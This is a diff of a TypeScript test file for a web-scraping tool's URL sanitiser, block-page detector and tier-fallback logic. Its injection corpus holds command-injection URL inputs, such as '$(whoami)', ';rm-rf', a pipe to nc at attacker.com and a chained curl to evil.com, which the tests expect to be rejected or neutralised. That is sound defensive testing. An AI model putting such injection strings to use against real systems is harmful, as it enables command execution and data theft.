@@ -23,14 +23,14 @@
  *   served as success.
  *
  * Run:
- *   bun test ~/.claude/skills/Data/BrightData/Tools/BrightDataTool.test.ts
+ *   bun test skills/Data/BrightData/Tools/BrightDataTool.test.ts
  */
 
 import { describe, test, expect, spyOn, beforeEach, afterEach, mock } from "bun:test";
-import { mkdtempSync, rmSync, readFileSync, existsSync, writeFileSync } from "fs";
-import { tmpdir } from "os";
-import { join } from "path";
-import * as childProcess from "child_process";
+import { mkdtempSync, rmSync, readFileSync, existsSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import * as childProcess from "node:child_process";
 import { BrightDataTool, sanitizeUrl, looksLikeBotBlockPage } from "./BrightDataTool.ts";
 import type { ScrapeAuditEntry } from "./BrightDataTool.ts";
 
@@ -57,7 +57,7 @@ function readLastAuditEntry(kayaHome: string): ScrapeAuditEntry {
   const auditPath = join(kayaHome, "MEMORY", "MONITORING", "audit", "brightdata-scrapes.jsonl");
   expect(existsSync(auditPath)).toBe(true);
   const lines = readFileSync(auditPath, "utf-8").trim().split("\n");
-  return JSON.parse(lines[lines.length - 1]) as ScrapeAuditEntry;
+  return JSON.parse(lines[lines.length - 1] ?? "") as ScrapeAuditEntry;
 }
 
 describe("BrightDataTool — tier-labeling honesty", () => {
@@ -137,7 +137,7 @@ describe("BrightDataTool — tier-labeling honesty", () => {
     // 2. A default (browserless) scrape of the same domain must start at tier 1,
     //    not at cached tier 3 (which would skip to the always-fails tier 4).
     fetchSpy = spyOn(globalThis, "fetch").mockImplementation(
-      async () => new Response("<html><body>tier1 content</body></html>", { status: 200 })
+      (async () => new Response("<html><body>tier1 content</body></html>", { status: 200 })) as unknown as typeof fetch,
     );
     const result = await tool.scrape("https://spa.example.com", {});
     expect(result.success).toBe(true);
@@ -147,8 +147,7 @@ describe("BrightDataTool — tier-labeling honesty", () => {
 
   test("no-regression: tier-1 success records winningTier 1", async () => {
     fetchSpy = spyOn(globalThis, "fetch").mockImplementation(
-      async () =>
-        new Response("<html><body>tier1 content</body></html>", { status: 200 })
+      (async () => new Response("<html><body>tier1 content</body></html>", { status: 200 })) as unknown as typeof fetch,
     );
 
     const tool = new BrightDataTool({ kayaHome });
@@ -166,7 +165,7 @@ describe("BrightDataTool — tier-labeling honesty", () => {
 
   test("no-regression: tier-2 success (skipBrowser default) records winningTier 2", async () => {
     execSpy = spyOn(childProcess, "execFileSync").mockImplementation(
-      () => "<html><body>tier2 content</body></html>"
+      (() => "<html><body>tier2 content</body></html>") as unknown as typeof childProcess.execFileSync,
     );
 
     const tool = new BrightDataTool({ kayaHome });
@@ -199,113 +198,85 @@ describe("BrightDataTool — tier-labeling honesty", () => {
  */
 describe("sanitizeUrl — injection corpus (must still throw, or documents why a layer above the regex already neutralizes it)", () => {
   test("$() command substitution still throws via the bare $ — the load-bearing pair-coverage argument: dropping ( and ) alone does not open $(...) because $ alone is still blocked", () => {
-    expect(() => sanitizeUrl("https://example.com/$(whoami)")).toThrow(
-      /unsafe in shell context/
-    );
+    expect(() => sanitizeUrl("https://example.com/$(whoami)")).toThrow(/unsafe in shell context/);
   });
 
   test("; command chaining in the pathname still throws", () => {
-    expect(() => sanitizeUrl("https://example.com/foo;rm-rf")).toThrow(
-      /unsafe in shell context/
-    );
+    expect(() => sanitizeUrl("https://example.com/foo;rm-rf")).toThrow(/unsafe in shell context/);
   });
 
   test("| piping in the pathname still throws", () => {
-    expect(() =>
-      sanitizeUrl("https://example.com/foo|nc-attacker.com-4444")
-    ).toThrow(/unsafe in shell context/);
+    expect(() => sanitizeUrl("https://example.com/foo|nc-attacker.com-4444")).toThrow(/unsafe in shell context/);
   });
 
   test("&& chaining in the pathname still throws via &, distinct from the query-string & exclusion (which only applies to url.search, never url.pathname)", () => {
-    expect(() =>
-      sanitizeUrl("https://example.com/foo&&curl-evil.com/bar")
-    ).toThrow(/unsafe in shell context/);
+    expect(() => sanitizeUrl("https://example.com/foo&&curl-evil.com/bar")).toThrow(/unsafe in shell context/);
   });
 
-  test("all throwing entries above use the same error message shape (\"unsafe in shell context\") so existing caller error-handling is unaffected by the narrowing", () => {
+  test('all throwing entries above use the same error message shape ("unsafe in shell context") so existing caller error-handling is unaffected by the narrowing', () => {
     expect(() => sanitizeUrl("https://example.com/foo;bar")).toThrow(
-      "URL pathname contains characters unsafe in shell context: /foo;bar"
+      "URL pathname contains characters unsafe in shell context: /foo;bar",
     );
   });
 
   test("backtick command substitution does NOT throw — the URL constructor itself percent-encodes backtick to %60 in the pathname before sanitizeUrl's regex ever runs, so the literal backtick the regex is written to catch never survives URL parsing. True both before and after this narrowing (backtick was never dropped from the character class) — not a regression, a pre-existing layered defense the regex text alone doesn't reveal.", () => {
-    expect(sanitizeUrl("https://example.com/`whoami`")).toBe(
-      "https://example.com/%60whoami%60"
-    );
+    expect(sanitizeUrl("https://example.com/`whoami`")).toBe("https://example.com/%60whoami%60");
   });
 
   test("< and > redirects do NOT throw — the URL constructor percent-encodes both to %3C/%3E in the pathname before sanitizeUrl's regex runs (same layered defusal as backtick, per the WHATWG URL path percent-encode set). True both before and after this narrowing.", () => {
-    expect(sanitizeUrl("https://example.com/foo<script>bar")).toBe(
-      "https://example.com/foo%3Cscript%3Ebar"
-    );
+    expect(sanitizeUrl("https://example.com/foo<script>bar")).toBe("https://example.com/foo%3Cscript%3Ebar");
   });
 
   test("backslash in the pathname does NOT throw — WHATWG URL parsing treats \\ as a path separator for special schemes (http/https) and rewrites it to /, so a literal backslash never reaches sanitizeUrl's regex at all. True both before and after this narrowing.", () => {
-    expect(sanitizeUrl("https://example.com/foo\\bar")).toBe(
-      "https://example.com/foo/bar"
-    );
+    expect(sanitizeUrl("https://example.com/foo\\bar")).toBe("https://example.com/foo/bar");
   });
 
   test("embedded raw newline in the pathname does NOT throw — the URL constructor strips ASCII tab/newline entirely during parsing (WHATWG URL Standard's tab-and-newline removal step) before sanitizeUrl's regex ever sees the string. Per the settled scope, no explicit \\n check was added to the regex to compensate — the URL layer already removes it, and adding a redundant check would be scope creep beyond the approved narrowing.", () => {
-    expect(sanitizeUrl("https://example.com/foo\nbar")).toBe(
-      "https://example.com/foobar"
-    );
+    expect(sanitizeUrl("https://example.com/foo\nbar")).toBe("https://example.com/foobar");
   });
 
-  test("embedded raw null byte in the pathname does NOT throw — the URL constructor percent-encodes it to the literal text \"%00\" before sanitizeUrl's regex runs; the regex has never checked for \\0 (neither before nor after this narrowing), so this is inert by construction of the URL layer, not by the shell-metachar check.", () => {
-    expect(sanitizeUrl("https://example.com/foo\0bar")).toBe(
-      "https://example.com/foo%00bar"
-    );
+  test('embedded raw null byte in the pathname does NOT throw — the URL constructor percent-encodes it to the literal text "%00" before sanitizeUrl\'s regex runs; the regex has never checked for \\0 (neither before nor after this narrowing), so this is inert by construction of the URL layer, not by the shell-metachar check.', () => {
+    expect(sanitizeUrl("https://example.com/foo\0bar")).toBe("https://example.com/foo%00bar");
   });
 
   test("fullwidth homoglyphs (＄ ｀) are NOT blocked — deliberate, per plan §5: the URL constructor percent-encodes them as non-ASCII UTF-8 bytes before the regex runs, and even if they reached the regex verbatim they are not real shell metacharacters to execve()/fetch(), only to a human eye or a naive shell wrapper. Documented explicitly so a future reader knows this was a deliberate decision, not an oversight.", () => {
-    expect(sanitizeUrl("https://example.com/foo＄｀bar")).toBe(
-      "https://example.com/foo%EF%BC%84%EF%BD%80bar"
-    );
+    expect(sanitizeUrl("https://example.com/foo＄｀bar")).toBe("https://example.com/foo%EF%BC%84%EF%BD%80bar");
   });
 
   test("scheme allowlist is unchanged by this narrowing — ftp: still throws the scheme error (guards against an accidental over-edit reaching the unrelated SSRF/protocol boundary at :102-106)", () => {
-    expect(() => sanitizeUrl("ftp://example.com/foo")).toThrow(
-      /Unsupported URL scheme: ftp:/
-    );
+    expect(() => sanitizeUrl("ftp://example.com/foo")).toThrow(/Unsupported URL scheme: ftp:/);
   });
 
   test("scheme allowlist is unchanged by this narrowing — javascript: still throws the scheme error", () => {
-    expect(() => sanitizeUrl("javascript:alert(1)")).toThrow(
-      /Unsupported URL scheme: javascript:/
-    );
+    expect(() => sanitizeUrl("javascript:alert(1)")).toThrow(/Unsupported URL scheme: javascript:/);
   });
 });
 
 describe("sanitizeUrl — legitimate-URL corpus (must NOT throw after narrowing)", () => {
   test("Wikipedia-style disambiguation parens in the pathname now pass (previously rejected — the false-rejection class this narrowing exists to fix)", () => {
-    expect(
-      sanitizeUrl("https://en.wikipedia.org/wiki/Godzilla_(1998_film)")
-    ).toBe("https://en.wikipedia.org/wiki/Godzilla_(1998_film)");
+    expect(sanitizeUrl("https://en.wikipedia.org/wiki/Godzilla_(1998_film)")).toBe(
+      "https://en.wikipedia.org/wiki/Godzilla_(1998_film)",
+    );
   });
 
   test("apostrophe in a pathname slug now passes (previously rejected)", () => {
-    expect(sanitizeUrl("https://example.com/o'brien-media")).toBe(
-      "https://example.com/o'brien-media"
-    );
+    expect(sanitizeUrl("https://example.com/o'brien-media")).toBe("https://example.com/o'brien-media");
   });
 
   test("band-disambiguation parens now pass", () => {
     expect(sanitizeUrl("https://example.com/wiki/Say_Anything_(band)")).toBe(
-      "https://example.com/wiki/Say_Anything_(band)"
+      "https://example.com/wiki/Say_Anything_(band)",
     );
   });
 
   test("already-percent-encoded parens continue to pass — unaffected by the narrowing, they passed before too", () => {
-    expect(
-      sanitizeUrl("https://example.com/wiki/Say_Anything_%28band%29")
-    ).toBe("https://example.com/wiki/Say_Anything_%28band%29");
+    expect(sanitizeUrl("https://example.com/wiki/Say_Anything_%28band%29")).toBe(
+      "https://example.com/wiki/Say_Anything_%28band%29",
+    );
   });
 
   test("query string with & continues to pass — unaffected by the narrowing; query strings were already excluded from the check (url.search is never tested against the regex)", () => {
-    expect(sanitizeUrl("https://example.com/path?a=1&b=2")).toBe(
-      "https://example.com/path?a=1&b=2"
-    );
+    expect(sanitizeUrl("https://example.com/path?a=1&b=2")).toBe("https://example.com/path?a=1&b=2");
   });
 
   // Regression guard: real URLs pulled from the live BrightData audit log
@@ -364,7 +335,8 @@ describe("BrightDataTool — tier 4 (Web Unlocker REST)", () => {
   test("unlocker success records winningTier 4, brightDataUsed, and the tier-4 breaker stamp", async () => {
     writeFileSync(join(kayaHome, "secrets.json"), JSON.stringify({ BRIGHTDATA_API_TOKEN: "t" }));
     fetchSpy = spyOn(globalThis, "fetch").mockImplementation(
-      async () => new Response("<html><body>unlocked real content</body></html>", { status: 200 })
+      (async () =>
+        new Response("<html><body>unlocked real content</body></html>", { status: 200 })) as unknown as typeof fetch,
     );
 
     const tool = new BrightDataTool({ kayaHome });
@@ -387,7 +359,8 @@ describe("BrightDataTool — tier 4 (Web Unlocker REST)", () => {
   test("unlocker-served block page is a failure, never a cached success", async () => {
     writeFileSync(join(kayaHome, "secrets.json"), JSON.stringify({ BRIGHTDATA_API_TOKEN: "t" }));
     fetchSpy = spyOn(globalThis, "fetch").mockImplementation(
-      async () => new Response("<title>Attention Required! | Cloudflare</title>", { status: 200 })
+      (async () =>
+        new Response("<title>Attention Required! | Cloudflare</title>", { status: 200 })) as unknown as typeof fetch,
     );
 
     const tool = new BrightDataTool({ kayaHome });
@@ -401,9 +374,7 @@ describe("BrightDataTool — tier 4 (Web Unlocker REST)", () => {
 
 describe("looksLikeBotBlockPage", () => {
   test("Cloudflare 'Attention Required' interstitial matches", () => {
-    expect(
-      looksLikeBotBlockPage("<title>Attention Required! | Cloudflare</title><p>blocked</p>")
-    ).toBe(true);
+    expect(looksLikeBotBlockPage("<title>Attention Required! | Cloudflare</title><p>blocked</p>")).toBe(true);
   });
 
   test("Cloudflare 'Sorry, you have been blocked' matches", () => {
@@ -411,15 +382,14 @@ describe("looksLikeBotBlockPage", () => {
   });
 
   test("ordinary small page does not match", () => {
-    expect(
-      looksLikeBotBlockPage("<html><body><h1>Events this weekend</h1><ul><li>Show</li></ul></body></html>")
-    ).toBe(false);
+    expect(looksLikeBotBlockPage("<html><body><h1>Events this weekend</h1><ul><li>Show</li></ul></body></html>")).toBe(
+      false,
+    );
   });
 
   test("large page mentioning the phrases does not match (size gate)", () => {
     const article =
-      "<article>How CDNs work: sometimes you see Sorry, you have been blocked pages…</article>" +
-      "x".repeat(25_000);
+      "<article>How CDNs work: sometimes you see Sorry, you have been blocked pages…</article>" + "x".repeat(25_000);
     expect(looksLikeBotBlockPage(article)).toBe(false);
   });
 });
